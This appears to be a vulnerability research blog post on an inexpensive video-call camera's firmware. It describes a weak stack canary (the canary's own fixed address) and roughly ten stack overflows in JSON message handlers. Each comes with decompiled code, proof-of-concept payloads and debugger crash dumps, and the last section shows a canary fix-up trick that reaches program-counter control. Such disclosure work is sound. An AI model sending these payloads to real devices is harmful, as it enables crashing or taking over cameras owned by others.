---
published: true
title: "🎥 [3] Death by Stack Overflows + Canary Fun"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Memory Corruption
  - Stack Canaries
tagline: "In this blog, I will present the findings of the research I did involving the stack. I found a bunch of stack overflows, and found an interesting weakness in their stack overflow mitigation!"
excerpt: "I found so many stack overflows that they need their own blog!"
windowGradientStart: rgb(59, 59, 59)
windowGradientEnd: rgb(22, 22, 22)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(255, 255, 255)
maximizeButton: rgb(0, 0, 255)
closeButton: rgb(255, 0, 0)
---

We know from the last blog that stack canaries are enabled on the **App** binary, which should seriously hurt our chances of finding an exploitable stack bug.

# Bugs

## Stack Canary Weakness

I was looking around the binary and I looked at the canary check and something felt off:

![canary_set.png](/assets/images/video_call_camera_p4/canary_set.png)

![canary_check.png](/assets/images/video_call_camera_p4/canary_check.png)

Are they seriously using the address of the canary as the canary?

![canary_location.png](/assets/images/video_call_camera_p4/canary_location.png)

So the address of the canary is *0x65b230*, and if you look in the memory dump of a stack frame:

```
0xb512c3b0: 0x00000000  0xb6f4c1a0  0x00000000  0x00000030
0xb512c3c0: 0x00000007  0x00000000  0x00000000  0x00b0bab0
0xb512c3d0: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c3e0: 0xfffffe00  0x00000000  0x00000000  0x00000000
0xb512c3f0: 0xfffffffe  0xffffffff  0xb512c534  0x00000000
0xb512c400: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c410: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c420: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c430: 0x00b06dd0  0x00023a14  0xb512c448  0x0065b230 <---- Fixed canary address 💀
0xb512c440: 0x00b004a0  0xb512c514  0x00b0bab0  0x0000041e
```

It is annoying that the protocol is string-based, so the *0x00* character stops us from taking advantage of this weakness if we find something like an **sprintf** stack overflow. However if we find a **memcpy**-based stack overflow or some other non-string based overflow, we might be able to bypass the canary and win.

![canary.jpg](/assets/images/video_call_camera_p4/canary.jpg)

## Stack Overflow 1

In the handler for message type *0x43a*, the *Name* parameter from the JSON payload is extracted, and this is passed to a fetched subfunction.

![stack_overflow_1.png](/assets/images/video_call_camera_p4/stack_overflow_1_caller.png)

Within this function, one of the first things it does is checks for the presense of a *.* character. If this character is not present, it does a safe copy into a stack buffer. If the *.* character is present however, it does an unsafe **memcpy** where the length of the copy is the distance between the start of the *Name* string and the location of the *.* character - leading to a stack buffer overflow.

![stack_overflow_1.png](/assets/images/video_call_camera_p4/stack_overflow_1.png)

## Stack Overflow 1.5

The *0x438* handler has the exact same code pattern that triggers the overflow, so replacing *0x4ac* with *0x438* and handling an extra reference resolve will trigger the same crash.

To trigger this vulnerability, you can send the following message with type *0x4ac*:

```
-json
{
  "SessionID": "0x0001869f",
  "Name": "aaaa ...*LOTS MORE a's*... aaaa.",
  "aaaa ...*LOTS MORE a's*... aaaa." : "tnr"
}
```

Here is the *gef* output:

```
Thread 41 "NetIPManager" received signal SIGILL, Illegal instruction.
[Switching to Thread 639.736]
0xb6f626dc in __stack_chk_fail () from target:/lib/ld-musl-arm.so.1

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0xb527017c  →  0xb6fdba04  →  0xb6fdbb40  →  0xb6fdbb50  →  0x00000001
$r1  : 0xb5276d6c  →  0xb5276d6c  →  [loop detected]
$r2  : 0x6104d351
$r3  : 0x61616161 ("aaaa"?)
$r4  : 0xb527024c  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
$r5  : 0x00b67470  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$r6  : 0x00b6759c  →  0x0000002e ("."?)
$r7  : 0x00b2b6f0  →  0x0051efd0  →  0x001846a8  →   ldr r3,  [pc,  #20]	@ 0x1846c4
$r8  : 0x0009a804  →   push {r4,  r5,  r6,  lr}
$r9  : 0x0       
$r10 : 0x0       
$r11 : 0x00b29b90  →  0x00000001
$r12 : 0x005f02c8  →  0xb6f626dc  →  <__stack_chk_fail+0> udf #0
$sp  : 0xb5270170  →  0xb527024c  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
$lr  : 0x0009aa0c  →  0xe28d002c (","?)
$pc  : 0xb6f626dc  →  <__stack_chk_fail+0> udf #0
$cpsr: [negative zero CARRY overflow interrupt fast thumb]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xb5270170│+0x0000: 0xb527024c  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"	 ← $sp
0xb5270174│+0x0004: 0x7bee0b3c
0xb5270178│+0x0008: 0x00000001
0xb527017c│+0x000c: 0xb6fdba04  →  0xb6fdbb40  →  0xb6fdbb50  →  0x00000001	 ← $r0
0xb5270180│+0x0010: 0x004f8cb8  →  0x00022df4  →   ldr r3,  [pc,  #72]	@ 0x22e44
0xb5270184│+0x0014: 0x00b2b360  →  0xb6fdc2d0  →  0x00000000
0xb5270188│+0x0018: 0x00000000
0xb527018c│+0x001c: 0x00000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
   0xb6f626d0                  andeq  r9,  r7,  r4,  ror #17
   0xb6f626d4                  andeq  r0,  r0,  r12,  lsr #32
   0xb6f626d8                  bicmi  r4,  r6,  sp,  ror #28
 → 0xb6f626dc <__stack_chk_fail+0> udf    #0
   0xb6f626e0 <__stack_chk_fail+4> bx     lr
   0xb6f626e4 <clearenv+0>     ldr    r3,  [pc,  #68]	@ 0xb6f62730 <clearenv+76>
   0xb6f626e8 <clearenv+4>     ldr    r2,  [pc,  #68]	@ 0xb6f62734 <clearenv+80>
   0xb6f626ec <clearenv+8>     add    r3,  pc,  r3
   0xb6f626f0 <clearenv+12>    push   {r4,  lr}
```

Looks like we clobbered a canary! This bug is most likely not exploitable due to being string-based, if there was another bug in the function that fixed the null terminator we might have been in with a chance.

## Stack Overflow 2

For message type *0xdac*, there is a trivial **sprintf** stack overflow due to missing length checks on the *Path* parameter from the JSON payload. 

The intended functionality of the *ListFiles* subcommand is to send a list of the contents of the specified directory, but rather than using a safe path they trust the user input, and use an unbounded **sprintf** call into a fixed size stack buffer:

![stack_overflow_1.png](/assets/images/video_call_camera_p4/stack_overflow_2.png)

To trigger this vulnerability, you can send the following message with type *0xdac*:

```
-json
{
  "SessionID": "0x0001869f",
  "OPFile": {
    "FuncType": 1,
    "Action": "ListFiles",
    "Path": "/mnt/mtd/Flags/././. ... ...*LOTS MORE ./'s*... /./././.."
  }
}
```

And here is the *gef* output:

```
Thread 41 "NetIPManager" received signal SIGSEGV, Segmentation fault.
0xb6dd9308 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_dispose() ()
   from target:/lib/libstdc++.so.6

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x6c5f6972 ("ri_l"?)
$r1  : 0x69772f2e ("./wi"?)
$r2  : 0x0       
$r3  : 0x2e2f2e2f ("/./."?)
$r4  : 0x6c5f698e
$r5  : 0x69772f2e ("./wi"?)
$r6  : 0x2e2f2e2f ("/./."?)
$r7  : 0x69772f2e ("./wi"?)
$r8  : 0x2e2f2e2f ("/./."?)
$r9  : 0x00676f6c  →  0x00000000
$r10 : 0xb5204f60  →  "/./././././././././././../wifi_list_log"
$r11 : 0x6c5f6966 ("fi_l"?)
$r12 : 0x005f0598  →  0xb6dd9308  →  <std::__cxx11::basic_string<char,+0> ldr r3,  [r0],  #8
$sp  : 0xb5204cf0  →  0xb5204f38  →  "/././././././././././././././././././././././././.[...]"
$lr  : 0x00099e20  →   b 0x99e0c
$pc  : 0xb6dd9308  →  <std::__cxx11::basic_string<char,+0> ldr r3,  [r0],  #8
$cpsr: [negative zero CARRY overflow interrupt fast thumb]
─────────────────────────────────────────────────────────────────────────────
```

Interestingly we didn't clobber a canary this time, but we have such a small amount of control of the contents we overflow with that this will likely still be a DoS.

## Stack Overflow 3

It wouldn't be an Aliexpress device without a trivial **strcpy** stack overflow! In the handler for *0x5a4*, there is a subcommand *OPFileQuery* that has a few parameters, the *Event* parameter gets passed into a **strcpy** into a stack buffer - classic.

![stack_overflow_3.png](/assets/images/video_call_camera_p4/stack_overflow_3.png)

This is a nice easy PoC.

```
-json
JSON Payload:
{
  "SessionID": "0x0001869f",
  "OPFileQuery": {
    "LowChannel": 1,
    "HighChannel": 1,
    "Type": "idk",
    "Event": "aaaaaaa ...*LOTS MORE a's*... aaaaaa",
    "BeginTime": "0000-00-00 00:00:00",
    "EndTime": "0000-00-00 00:00:00",
    "LowStreamType": "0"
  }
}
```

And here is the *gef* output:

```
Thread 42 "NetIPManager" received signal SIGILL, Illegal instruction.
[Switching to Thread 640.737]
0xb6ea66dc in __stack_chk_fail () from target:/lib/ld-musl-arm.so.1

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0x0       
$r2  : 0x6104d351
$r3  : 0x61616161 ("aaaa"?)
$r4  : 0xb50b0f44  →  0xb50b0f4c  →  0x6c706500
$r5  : 0x0001869f  →   b.n 0x189e2
$r6  : 0x3       
$r7  : 0xb68cb400  →  0x000001ff
$r8  : 0x00b287a0  →  0x00521b18  →  0x001aa194  →   ldr r3,  [pc,  #20]	@ 0x1aa1b0
$r9  : 0x0       
$r10 : 0x00b0a0d0  →  0xb6f205c0  →  0x00000000
$r11 : 0x3       
$r12 : 0x005f02c8  →  0xb6ea66dc  →  <__stack_chk_fail+0> udf #0
$sp  : 0xb50b0df8  →  0x00000077 ("w"?)
$lr  : 0x001aa6a8  →   ldr r1,  [pc,  #2372]	@ 0x1aaff4
$pc  : 0xb6ea66dc  →  <__stack_chk_fail+0> udf #0
$cpsr: [negative zero CARRY overflow interrupt fast thumb]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xb50b0df8│+0x0000: 0x00000077 ("w"?)	 ← $sp
0xb50b0dfc│+0x0004: 0x00000000
0xb50b0e00│+0x0008: 0xffffffff
0xb50b0e04│+0x000c: 0xb50b0f44  →  0xb50b0f4c  →  0x6c706500
0xb50b0e08│+0x0010: 0x00000000
0xb50b0e0c│+0x0014: 0x00000000
0xb50b0e10│+0x0018: 0x00000000
0xb50b0e14│+0x001c: 0x00000001
─────────────────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
   0xb6ea66d0                  andeq  r9,  r7,  r4,  ror #17
   0xb6ea66d4                  andeq  r0,  r0,  r12,  lsr #32
   0xb6ea66d8                  bicmi  r4,  r6,  sp,  ror #28
 → 0xb6ea66dc <__stack_chk_fail+0> udf    #0
   0xb6ea66e0 <__stack_chk_fail+4> bx     lr
   0xb6ea66e4 <clearenv+0>     ldr    r3,  [pc,  #68]	@ 0xb6ea6730 <clearenv+76>
   0xb6ea66e8 <clearenv+4>     ldr    r2,  [pc,  #68]	@ 0xb6ea6734 <clearenv+80>
   0xb6ea66ec <clearenv+8>     add    r3,  pc,  r3
   0xb6ea66f0 <clearenv+12>    push   {r4,  lr}
```

Another canary down! :( This is a similar crash to overflow 1 which turned out to be unexploitable, so another dead-end.

## Stack Overflow 4

This is a pretty interesting bug, it is in the handler for the message type *0x41e* which seems to be encoding the incoming data somehow? The vulnerability is a stack buffer overflow, but it feels like it might be a bit more useful than a standard string-based stack overflow.

Looking at the code:

```
-c
if (0x18 < param_2->total_size) {
  blocks_per_row = (uint)param_2->total_number_of_0x18_blocks;
  min_zero_count = 999999;
  block_offset = 0;
  vertical_zero_counts[1] = 0;
  vertical_zero_counts[2] = 0;
  vertical_zero_counts[3] = 0;
  vertical_zero_counts[4] = 0;
  rows_of_0x18_blocks_per_group = (uint)(param_2->total_number_of_0x18_blocks >> 3);
  slice_index = 0;
  total_slices = param_2->total_size / 0x18;
  vertical_zero_counts[5] = 0;
  vertical_zero_counts[6] = 0;
  vertical_zero_counts[7] = 0;
  vertical_zero_counts[8] = 0;
  vertical_zero_counts[9] = 0;
  vertical_zero_counts[10] = 0;
  vertical_zero_counts[0xb] = 0;
  vertical_zero_counts[0xc] = 0;
  start_pos = rows_of_0x18_blocks_per_group - 1;
  current_count = vertical_zero_counts;
                  /* moving to the next chunk */
  do {
    for (i = start_pos; i != -1; i = i + -1) {
      current_byte = &param_2[1].buffer + i + (block_offset >> 3);
      remaining_bytes = 0x18;
      do {
        if (*current_byte != '\0') goto LAB_00184cb4;
        current_byte = current_byte + rows_of_0x18_blocks_per_group;
        remaining_bytes = remaining_bytes + -1;
      } while (remaining_bytes != 0);
      current_count[1] = current_count[1] + 1;
    }
LAB_00184cb4:
    current_count = current_count + 1;
    slice_index = slice_index + 1;
    if ((int)*current_count <= (int)min_zero_count) {
      min_zero_count = *current_count;
    }
    block_offset = block_offset + blocks_per_row * 0x18;
  } while (slice_index < (int)total_slices);
                  /* subtract minimum from each element of array */
  block_offset = 0;
  do {
    vertical_zero_counts[block_offset + 1] =
          vertical_zero_counts[block_offset + 1] - min_zero_count;
    block_offset = block_offset + 1;
  } while (block_offset < (int)total_slices);
  block_offset = 0;
  new_i = 0;
  do {
    min_zero_count = vertical_zero_counts[new_i + 1];
    if (min_zero_count != 0) {
      slice_index = 0;
      i = 0;
      m = 0x18;
      do {
        remaining_bytes = (block_offset >> 3) + (i >> 3);
        for (compressed_pos = &param_2->field_0x23 + start_pos + remaining_bytes + 1;
            (int)min_zero_count <=
            (int)compressed_pos - (int)(&param_2[1].buffer + remaining_bytes);
            compressed_pos = compressed_pos + -1) {
          *compressed_pos = compressed_pos[-min_zero_count];
        }
        memset(&param_2[1].buffer + (block_offset >> 3) + (slice_index >> 3),0,min_zero_count);
        i = i + blocks_per_row;
        slice_index = slice_index + blocks_per_row;
        m = m + -1;
      } while (m != 0);
    }
    new_i = new_i + 1;
    block_offset = block_offset + blocks_per_row * 0x18;
  } while (new_i < (int)total_slices);
}
```

There are essentially three loops that process the incoming data that we control:

- The first loop counts the number of consecutive zeros in a group of blocks (the size of which is determined by a parameter that we control). There is a fixed size stack buffer that keeps track of the counts, but it starts to increment out of bounds if we give a large total number of blocks in our input. It also keeps track of the minimum zero count.
- The second loop iterates over all of the incremented stack buffer entries (using the same length check as in the previous loop) and subtracts the minimum value from each of the counts.
- The third loop does some compression/shuffling of the values in order to reduce the total size of the buffer (I think).

I thought this might actually be quite useful, as we can control where we increment and how much we decrement by. This was until I realised that it is not clearing the values on the stack after the stack buffer, and a pointer to a high address is basically a massive negative number, which completely obliterates all of the values on the stack if we go out of bounds (including the canary)!

To demonstrate this, I wrote a quick POC and observed the following behaviour:

- Stack frame memory before the first 2 loops:

```
0xb512c3b0: 0x00000000  0xb6f4c1a0  0x00000000  0x00000030
0xb512c3c0: 0x00000007  0x00000000  0x00000000  0x00b0bab0
0xb512c3d0: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c3e0: 0xfffffe00  0x00000000  0x00000000  0x00000000
0xb512c3f0: 0xfffffffe  0xffffffff  0xb512c534  0x00000000
0xb512c400: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c410: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c420: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c430: 0x00b06dd0  0x00023a14  0xb512c448  0x0065b230
0xb512c440: 0x00b004a0  0xb512c514  0x00b0bab0  0x0000041e
0xb512c450: 0xb6946400  0xb512c494  0x00000000  0x00000000
0xb512c460: 0x00b06dd0  0x0016220c  0xb512c514  0x00000000
0xb512c470: 0x00000000  0x56442c68  0x2d504952  0x00000001
0xb512c480: 0x00531779  0x00000000  0x00000001  0x00000014
0xb512c490: 0x0051c064  0x00000000  0x00000000  0x00000000
0xb512c4a0: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c4b0: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c4c0: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c4d0: 0x00000000  0x00000000  0x00000000  0x00000000
```

The same memory region after the first 2 loops (lots of *0x4aed3bb8*):

```
0xb512c3b0: 0x00000000  0xb6f4c1a0  0x00000000  0x00000030
0xb512c3c0: 0x00000007  0x00000000  0x00000600  0x00b0bab0
0xb512c3d0: 0x00000000  0x00000000  0x00000000  0x00000000
0xb512c3e0: 0xfffffe00  0x00000000  0x00000000  0x00000000
0xb512c3f0: 0xfffffffe  0xffffffff  0xb512c534  0x4aed3bb8
0xb512c400: 0x4aed3bb8  0x4aed3bb8  0x4aed3bb8  0x4aed3bb8
0xb512c410: 0x4aed3bb8  0x4aed3bb8  0x4aed3bb8  0x4aed3bb8
0xb512c420: 0x4aed3bb8  0x4aed3bb8  0x4aed3bb8  0x4aed3bb8
0xb512c430: 0x4b9da988  0x4aef75cc  0x00000000  0x4b52ede8
0xb512c440: 0x4b9d4058  0x000000cc  0x4b9df668  0x4aed3fd6
0xb512c450: 0x01819fb8  0x0000004c  0x4aed3bb8  0x4aed3bb8
0xb512c460: 0x4b9da988  0x4b035dc4  0x000000cc  0x4aed3bb8
0xb512c470: 0x4aed3bb8  0xa1316820  0x783d850a  0x4aed3bb9
0xb512c480: 0x4b405331  0x4aed3bb8  0x4aed3bb9  0x4aed3bcc
0xb512c490: 0x4b3efc1c  0x4aed3bb8  0x4aed3bb8  0x4aed3bb8
0xb512c4a0: 0x4aed3bb8  0x4aed3bb8  0x4aed3bb8  0x4aed3bb8
0xb512c4b0: 0x4aed3bb8  0x4aed3bb8  0x4aed3bb8  0x00000000
0xb512c4c0: 0x00000000  0x00000000  0x00000000  0x00000000
```

All of the stuff we write out of bounds on the stack gets decremented by the minimum value, *0xb512c448*! This obviously obliterates the canary and causes a crash. For this reason, it looks like it is a DoS.

## Stack Overflow 5

Back to the less interesting string-based stack overflows! This one is slightly more subtle than blatant use of **strcpy**, but not by much. This time in the handler for message *0x414*:

```
-c
void FUN_0009628c(int param_1,char *name_parameter,undefined4 param_3)
{
  char cVar1;
  undefined4 uVar2;
  int iVar3;
  undefined auStack_1f0 [4];
  undefined auStack_1ec [12];
  undefined auStack_1e0 [24];
  undefined auStack_1c8 [32];
  undefined auStack_1a8 [32];
  undefined auStack_188 [32];
  undefined auStack_168 [32];
  undefined auStack_148 [32];
  char acStack_128 [260];
  undefined4 *local_24;
  
  local_24 = &__stack_chk_guard;
  FUN_0002a168(auStack_1f0,param_1 + 4,param_3,0);
  iVar3 = 0;
  while( true ) {
    cVar1 = *name_parameter;
    if (cVar1 == '.' || cVar1 == '\0') break;
    acStack_128[iVar3] = cVar1;
    iVar3 = iVar3 + 1;
    name_parameter = name_parameter + 1;
  }
  acStack_128[iVar3] = '\0';
  ...
```

It is clear that the while loop is basically doing a **strcpy** but also checking for *.* as well as the null terminator. There aren't any length checks and we can provide a string larger than *260* bytes, so we can overflow the stack buffer and once again meet the canary.

Another nice trivial POC.

```
-json
{
  "Name": "aaaaaaaaaaaaa ... aaaaaaaaaaaaa",
  "SessionID": "0x0001869f"
}
```

This code pattern also appears in three other functions, an example of another handler impacted by this bug is *0x438*.

## Stack Overflow(s) 6

At this stage, I was noticing a trend that pretty much everything we control is being processed on the stack, so I brainstormed some ways to bypass the fixed stack canary (with a null byte). My thinking was that if I could find a function with two string-based stack overflows, I might be able to do the following:
- First use the first overflow to clobber the saved link register on the stack (also clobbers the canary), set last three bytes of canary to be actual values of the address of the canary (due to the weakness)
- Use second overflow to add the null terminator (should be possible if copy gets terminated) to the correct position and fix up the canary
- Canary check then passes and we have overwritten *pc*, easy!

With this in mind, I found this stack overflow in the message handler for *0x410* which seemed to fit the bill:

```
-c
  char first_buffer [260];
  char second_buffer [260];
  char third_buffer [260];
  *there should be canary here but Ghidra got my hopes up for about 0.5 seconds by hiding it*
  
  piVar6 = param_1 + 1;
  FUN_0002a168(auStack_4b0,piVar6,param_3,0);
  strncpy((char *)(param_1 + 0x42),we_control_this,0x20);
  local_4ac = param_5;
  location_of_dot = strchr(we_control_this,L'.');
  if ((location_of_dot == (char *)0x0) ||
     ((location_of_dot[1] != '[' &&
      (location_of_dot = strchr(location_of_dot + 1,L'.'), location_of_dot == (char *)0x0)))) {
    location_of_dot = (char *)0x0;
    memset(second_buffer,0,0x104);
    strcpy(second_buffer,".");
                    /* first overflow */
    strcat(second_buffer,we_control_this);
    memset(third_buffer,0,0x104);
    strcpy(third_buffer,".");
  }
  else {
    memset(second_buffer,0,0x104);
    strcpy(second_buffer,".");
                    /* first overflow?? */
    strncpy(second_buffer + 1,we_control_this,(int)location_of_dot - (int)we_control_this);
    memset(third_buffer,0,0x104);
    strncpy(third_buffer,location_of_dot,0x103);
  }
  memset(first_buffer,0,0x104);
  pcVar1 = strchr(we_control_this,L'.');
  if (pcVar1 == (char *)0x0) {
    __n = 0x103;
  }
  else {
    __n = (int)pcVar1 - (int)we_control_this;
  }
                    /* second overflow */
  strncpy(first_buffer,we_control_this,__n);
  FUN_0002a9a4("CConfigManager::setConfig(%s, %s) to memery\n",second_buffer + 1,third_buffer + 1);
```

There is an overflow in the *if* statement no matter which way you go, the first statement being a **strcat** overflow, and the second being a **strncpy** overflow. Then after the *if* statement, there is another **strncpy** overflow which copies from the same string we overflowed first.

As the second overflow is copying into the first stack buffer, and the earlier overflows copy into the second, the canary fix up method should work provided **strncpy** will write a null terminator in the correct place!

However, I realised I made a huge assumption about the behaviour of **strncpy** and how it behaves in this case. If you look at the code, the second **strncpy** gets its length by subtracting the start of our controlled string from a pointer to the *.* character in the string. This means that as **strchr** was able to find the *.*, everything between the start of the string and the *.* are non-zero characters. Therefore, the **strncpy** will copy exactly *_n* non-zero characters, and will not place the null-terminator (as there is not any room) - hence we cannot get a null to the correct place.

This is very annoying, because in loads of other places in the code, they terminate their strings after copies - great!

On the bright side, we technically found three stack overflows in a single function!

![yay_another_dos.jpg](/assets/images/video_call_camera_p4/yay_another_dos.jpg)

Here is a POC for the crash, identical to the last one:

```
{
  "Name": "aaaaaaaa ... aaaaaaaa",
  "SessionID": "0x0001869f"
}
```

## Stack Overflow 7

This one is also in the handler for *0x410*, another **strncpy** turned **strcpy** - to hit this your *Name* parameter must contain *.[*:

```
-c
  pcVar1 = strstr(param_2,".[");
  if (pcVar1 == (char *)0x0) {
    ...
  }
  else {
    memset(acStack_234,0,0x104);
                  /* buffer overflow */
    strncpy(acStack_234,param_2,(int)pcVar1 - (int)param_2);
    memset(acStack_130,0,0x104);
    strncpy(acStack_130,pcVar1,0x103);
    iVar2 = strcmp(acStack_130,".[ff]");
    if (iVar2 == 0) {
```

Similar to the last POC but including *.[*:

```
{
  "Name": "aaaaaa ... aaaaaaaa.[",
  "SessionID": "0x0001869f"
}
```

## Stack Overflow 8

I'm starting to get sick of stack overflows now! This one is in the handler for message type *0x5a8*, its another **memcpy** overflow, but the information copied is derived from string-based functions (characters between pair of square brackets) so it still isn't possible to bypass the canary with this one. It does need to pass a few calls to **sscanf** so the below pattern is required to trigger it, here is a PoC:

```
-json
{
    "OPCompressPic": {
        "PicName": "/ideA1/0000-00-00/000/00.00.00-00.00.00[aaaaaaaa ... aaaaaaaa]"
    },
    "SessionID": "0x0001869f"
}
```

Here is the crash dump for this one:

```
Thread 42 "NetIPManager" received signal SIGILL, Illegal instruction.
0xb6f546dc in __stack_chk_fail () from target:/lib/ld-musl-arm.so.1

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0x00b1f921  →  0x22202c00
$r2  : 0x6104d351
$r3  : 0x61616161 ("aaaa"?)
$r4  : 0xb515eed0  →  0x0050f32c  →  0x001077f8  →   ldr r3,  [pc,  #32]	@ 0x107820
$r5  : 0x00b1f830  →  "/ideA1/0000-00-00/000/00.00.00-00.00.00[aaaaaaaaaa[...]"
$r6  : 0x0       
$r7  : 0x00b29490  →  0x00521b18  →  0x001aa194  →   ldr r3,  [pc,  #20]	@ 0x1aa1b0
$r8  : 0xb515f494  →  0x00000000
$r9  : 0x0       
$r10 : 0x0       
$r11 : 0x00b1f440  →  0x00000001
$r12 : 0x005f02c8  →  0xb6f546dc  →  <__stack_chk_fail+0> udf #0
$sp  : 0xb515ed48  →  0xb6e6e878  →  0x0014b760  →   mov r6,  r0
$lr  : 0x00108da0  →   ldr r1,  [pc,  #96]	@ 0x108e08
$pc  : 0xb6f546dc  →  <__stack_chk_fail+0> udf #0
$cpsr: [negative zero CARRY overflow interrupt fast thumb]
```

## Stack Overflow 9

While looking through some of the handlers I marked as 'interesting' earlier on, I came across something FTP-related. As I was browsing around the awful mess of decompiled C++, I realised that this isn't a server - its actually connecting to a server.

The message type is *0x7d8*, and you specify in a JSON payload a server name (or IP address, it can handle both), a port, and a username/password pair (but it defaults to 'anonymous' if a username is not specified).

```
-json
{
    "Name": "FTP",
    "FTP": {
        "Server": {
            "Name": "192.168.188.4",
            "Port": 9898,
            "UserName": "user",
            "Password": "pass"
        },
    },
    "SessionID": "0x0001869f",
}
```

Once these have been extracted, it tries to connect, and tries to create a **Test** directory on the server if there isn't one already. It then sends up the contents of the **/mnt/mtd/Log/Log** file, storing it in a file called **Test** within the **Test** directory.

There is a really simple stack overflow here that can be triggered with either the *UserName* parameter, or the *Password* parameter. The lengths of these are not checked and they go directly into an **sprintf** call, so they overflow a stack buffer and hit the stack canary!

![ftp_sprintf_overflow.png](/assets/images/video_call_camera_p4/ftp_sprintf_overflow.png)

Here is the crash resulting from overflowing *Password* (*Username* is the same):

```
0xb6ec46dc in __stack_chk_fail () from target:/lib/ld-musl-arm.so.1

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0xb4fcb5f4  →  0x61616100
$r2  : 0x6104d351
$r3  : 0x61616161 ("aaaa"?)
$r4  : 0x0       
$r5  : 0x59      
$r6  : 0x00b28620  →  0x00000000
$r7  : 0x00b27620  →  0x00523514  →  0x001be0dc  →   ldr r3,  [pc,  #88]	@ 0x1be13c
$r8  : 0xb4fcb5d8  →  "530 Authentication failed.\r\n"
$r9  : 0x00b25540  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$r10 : 0x0       
$r11 : 0x00b21f70  →  0x00000001
$r12 : 0x005f02c8  →  0xb6ec46dc  →  <__stack_chk_fail+0> udf #0
$sp  : 0xb4fcaec0  →  0xb6f3e520  →  0x00000000
$lr  : 0x001bbcc4  →   movw r3,  #5000	@ 0x1388
$pc  : 0xb6ec46dc  →  <__stack_chk_fail+0> udf #0
$cpsr: [negative zero carry overflow interrupt fast thumb]
```

## Stack Overflow 10

This is in the *0x7d8* handler like the previous overflow, but this time we overflow the *Name* parameter.

The *Name* parameter is extracted, and passed to a function that appears to resolve the host name:

![get_host_name.png](/assets/images/video_call_camera_p4/get_host_name.png)

This function calls a few functions deeper and eventually the name parameter is passed into a function that does processing on the provided name with this loop:

![buggy_loop.png](/assets/images/video_call_camera_p4/buggy_loop.png)

At a high level, it essentially copies the provided hostname into a stack-based buffer with no length checks so we can overflow the buffer, once again hitting the canary.

Here is the crash resulting from overflowing *Name*:

```
Thread 42 "NetIPManager" received signal SIGILL, Illegal instruction.
0xb6eb76dc in __stack_chk_fail () from target:/lib/ld-musl-arm.so.1

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0xffffffff
$r1  : 0x0       
$r2  : 0x6104d351
$r3  : 0x61616161 ("aaaa"?)
$r4  : 0x2       
$r5  : 0x12      
$r6  : 0x61      
$r7  : 0xffffffff
$r8  : 0x22      
$r9  : 0x42      
$r10 : 0x0       
$r11 : 0x00b1df70  →  0x00000001
$r12 : 0x005f02c8  →  0xb6eb76dc  →  <__stack_chk_fail+0> udf #0
$sp  : 0xb50c16d0  →  0x00000200
$lr  : 0x0041dcf4  →   mov r12,  r0
$pc  : 0xb6eb76dc  →  <__stack_chk_fail+0> udf #0
$cpsr: [negative zero carry overflow interrupt fast thumb]
```

### Fixing the Canary

However, what makes this VERY interesting is the variable I highlighted in this snippet:

![buggy_loop_highlighted.png](/assets/images/video_call_camera_p4/buggy_loop_highlighted.png)

This acts as a counter that keeps track of the number of characters before either the null terminator or a '.'. Lets consider only '.' characters at the moment:
- The counter is initialised to zero before the while loop
- Within the loop:
  - If the current hostname character is not a '.', the counter is incremented
  - If it is a '.', the break is hit
- Once the break is hit, this counter is stored in the stack buffer at the current offset from the start
- Wait, so if we provide multiple '.' characters in a row, the counter will be reset to zero after the first dot, and then the second dot will be encountered and a zero will be written

This means, we can control our input such that we can write the null terminator back into the location of the stack canary and continue overflowing the stack contents after it (including *pc*!)

![restored_canary.png](/assets/images/video_call_camera_p4/restored_canary.png)

And when we put the canary back in its rightful place, we get the following crash:

```
Thread 41 "NetIPManager" received signal SIGSEGV, Segmentation fault.
0x0a646464 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0xffffffff
$r1  : 0x0       
$r2  : 0x0       
$r3  : 0x0065b230  →  0x9c3e6919
$r4  : 0x62626241 ("Abbb"?)
$r5  : 0x62626262 ("bbbb"?)
$r6  : 0x62626262 ("bbbb"?)
$r7  : 0x6363630b ("\vccc"?)
$r8  : 0x63636363 ("cccc"?)
$r9  : 0x63636363 ("cccc"?)
$r10 : 0x6464640a ("\nddd"?)
$r11 : 0x64646464 ("dddd"?)
$r12 : 0xb51a6690  →  0x00000000
